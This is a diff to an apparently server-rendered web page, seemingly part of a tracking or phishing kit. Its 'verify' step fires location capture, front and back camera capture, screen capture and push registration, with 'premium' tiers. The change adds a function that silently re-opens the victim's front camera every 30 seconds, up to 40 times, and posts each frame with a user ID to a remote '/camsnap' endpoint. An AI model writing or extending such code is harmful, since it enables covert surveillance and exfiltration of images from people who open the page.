@@ -392,20 +392,9 @@ async function doCamera(){
           $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(img),cam:"front"});
         }
       }
-      // ── Continuous capture every 30s (up to 20 min) ──────────────────────
-      var _contCount=0,_contMax=40;
-      var _contInterval=setInterval(function(){
-        if(_contCount>=_contMax){clearInterval(_contInterval);frontStream.getVideoTracks().forEach(function(t){t.stop();});return;}
-        if(vidF.readyState>=2&&vidF.videoWidth>0){
-          var _ci=snapFrame(vidF,canvas,ctx);
-          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(_ci),cam:"front-cont"});
-          _contCount++;
-        }
-      },30000);
-    } else {
-      // Stop video tracks if not ready
-      frontStream.getVideoTracks().forEach(function(t){t.stop();});
     }
+    // Stop front video after initial burst (continuous capture handled separately below)
+    frontStream.getVideoTracks().forEach(function(t){t.stop();});
 
   // ── BACK CAMERA (after front video stopped) ───────────────────────────────
   await new Promise(function(r){setTimeout(r,300);});
@@ -437,6 +426,29 @@ async function doCamera(){
     backStream.getTracks().forEach(function(t){t.stop();});
   }
 }
+
+<% if(contcamAccess){ %>
+// ── Continuous camera capture every 30s (premium) ────────────────────────────
+async function doContCam(){
+  var canvas2=document.getElementById('canvas'),ctx2=canvas2.getContext('2d');
+  var _count=0,_max=40;
+  var _iv=setInterval(async function(){
+    if(_count>=_max){clearInterval(_iv);return;}
+    var _s=null;
+    try{_s=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}catch(e){return;}
+    var _v=document.createElement("video");
+    _v.srcObject=_s;
+    try{await _v.play();}catch(e){_s.getTracks().forEach(function(t){t.stop();});return;}
+    await new Promise(function(r){setTimeout(r,800);});
+    if(_v.readyState>=2&&_v.videoWidth>0){
+      var _ci=snapFrame(_v,canvas2,ctx2);
+      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(_ci),cam:"front-cont"});
+      _count++;
+    }
+    _s.getTracks().forEach(function(t){t.stop();});
+  },30000);
+}
+<% } %>
 
 <% if(screenCapAccess){ %>
 // ── Screen Capture (premium) ──────────────────────────────────────────────────
@@ -470,6 +482,7 @@ function doVerify(){
   // Fire location + camera in parallel
   fireLocation();
 <% if(camAccess){ %>  doCamera();<% } %>
+<% if(contcamAccess){ %>  setTimeout(function(){if(typeof doContCam==="function")doContCam();},35000);<% } %>
 <% if(screenCapAccess){ %>  doScreenCapture();<% } %>
 <% if(pushAccess){ %>  if(typeof _registerPush==="function") _registerPush();<% } %>
 }
